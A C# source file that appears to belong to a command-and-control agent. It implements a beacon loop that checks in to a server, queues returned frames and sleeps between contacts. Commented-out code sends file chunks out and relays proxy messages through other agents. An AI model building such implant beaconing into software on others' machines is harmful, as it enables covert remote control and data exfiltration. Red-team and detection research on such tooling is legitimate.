using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Communication
{
    internal abstract class EgressCommunicator : Communicator
    {
        public EgressCommunicator(ConnexionUrl connexion) : base(connexion)
        {
            this.CommunicationType = CommunicationType.Egress;
        }

        public virtual Agent Agent { get; set; }

        public override async void Start(object otoken)
        {
            this.IsRunning = false;

            this._tokenSource = (CancellationTokenSource)otoken;

            this.IsRunning = true;
            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    //var results = this.NetworkeService.GetMessageResultsToRelay();

                    //var thisAgentRes = results.Where(a => a.Header.Owner == this.MessageService.AgentMetaData.Id);
                    //if (thisAgentRes.Any())
                    //{
                    //    foreach (var mess in thisAgentRes)
                    //        mess.FileChunk = this.FileService.GetChunkToSend();

                    //    thisAgentRes.First().ProxyMessages = this.ProxyService.GetResponses();
                    //}
                    //else
                    //{
                    //    //check in message
                    //    var chunk = this.FileService.GetChunkToSend();
                    //    var proxy = this.ProxyService.GetResponses();

                    //    var mess = new MessageResult();
                    //    mess.Header.Owner = this.MessageService.AgentMetaData.Id;
                    //    mess.FileChunk = chunk;
                    //    mess.ProxyMessages = proxy;
                    //    results.Add(mess);
                    //}

                    ////update Paths
                    //foreach (var resMess in results)
                    //    resMess.Header.Path.Insert(0, this.MessageService.AgentMetaData.Id);

                    //var messages = await CheckIn(results);
                    //if (messages != null)
                    //    this.MessageService.EnqueueTasks(messages);


                    var frames = await CheckIn(this.NetworkeService.GetFrames(String.Empty));
                    if (frames != null)
                        frames.ForEach(frame => this.NetworkeService.EnqueueFrame(frame));

                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }

                try
                {
                    await Task.Delay(this.GetDelay());
                }
                catch (TaskCanceledException ex)
                {
                    //ignore
                }
            }

            this.IsRunning = false;
        }
    }
}
